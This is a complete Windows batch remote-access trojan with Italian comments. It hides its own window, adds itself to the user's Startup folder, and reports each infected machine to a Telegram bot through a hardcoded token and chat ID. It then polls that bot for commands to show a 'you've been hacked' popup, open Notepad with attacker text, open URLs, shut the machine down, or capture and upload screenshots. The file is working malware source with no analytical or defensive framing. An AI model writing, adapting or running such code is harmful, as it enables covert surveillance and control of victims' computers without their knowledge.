@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "LAST_UPDATE_ID=0"

:: Invia notifica di connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Shell aperta su: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_shell.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Controlla nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_UPDATE_ID%" > "%TEMP%\updates.json"

:: Estrai ultimo comando
for /f "delims=" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json' -Raw | ConvertFrom-Json; if($json.ok) { $update=$json.result[-1]; if($update.update_id -gt %LAST_UPDATE_ID%) { $LAST_UPDATE_ID=$update.update_id; if($update.message.text) { Write-Output ($update.update_id.ToString()+':'+$update.message.text) } } }"') do (
    set "update_data=%%A"
    set "LAST_UPDATE_ID=!update_data:*:=!"
    set "command=!update_data:*:=!"
    
    :: Notifica comando ricevuto
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
        -d "chat_id=%CHAT_ID%" ^
        -d "text=📩 Comando ricevuto: !command!"
    
    :: Esegui comando
    if /i "!command!" == "pop" (
        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Sei stato hackerato!','Attenzione',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=✅ Popup visualizzato su %COMPUTERNAME%"
    ) else if /i "!command:~0,5!" == "note " (
        set "note_text=!command:~5!"
        echo !note_text! > "%TEMP%\hacker_note.txt"
        notepad "%TEMP%\hacker_note.txt"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=📝 Notepad aperto su %COMPUTERNAME% con testo: !note_text!"
    ) else if /i "!command!" == "off" (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di %COMPUTERNAME% in corso..."
        shutdown /s /t 0
    ) else if /i "!command!" == "foto" (
        call :capture_screen
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
            -F chat_id=%CHAT_ID% ^
            -F photo=@"%SCREENSHOT_PATH%" ^
            -F caption="📸 Schermata completa da %COMPUTERNAME%"
        del "%SCREENSHOT_PATH%" >nul 2>&1
    ) else if /i "!command:~0,4!" == "url " (
        set "url=!command:~4!"
        start "" "!url!"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🌐 Aperto URL su %COMPUTERNAME%: !url!"
    )
)

:: Attesa 1 secondo prima di controllare nuovi comandi
timeout /t 1 /nobreak >nul
goto command_loop

:capture_screen
:: Cattura schermo intero
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 500; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
exit /b
